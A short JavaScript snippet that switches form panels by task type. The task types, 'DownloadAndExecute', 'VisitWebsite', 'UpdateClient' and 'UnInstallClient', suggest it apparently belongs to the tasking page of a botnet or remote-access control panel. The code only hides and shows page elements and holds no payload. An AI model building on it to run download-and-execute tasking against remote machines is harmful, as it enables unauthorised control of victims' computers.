

$(".spoiler-trigger").click(function() {
    $(this).parent().next().collapse('toggle');
});

function ChangeLayoutTasks(value) {
    
    document.getElementById('div_download_and_exec').style.display = 'none';
    document.getElementById('div_visit_website').style.display = 'none';
    document.getElementById('div_update_client').style.display = 'none';
    document.getElementById('div_uninstall_client').style.display = 'none';

    if(value == 'DownloadAndExecute')
    {
        document.getElementById('div_download_and_exec').style.display = 'block';
    }
    else if(value == 'VisitWebsite')
    {
        document.getElementById('div_visit_website').style.display = 'block';
    }
    else if(value == 'UpdateClient')
    {
        document.getElementById('div_update_client').style.display = 'block';
    }
    else if(value == 'UnInstallClient')
    {
        document.getElementById('div_uninstall_client').style.display = 'block';
    }
}


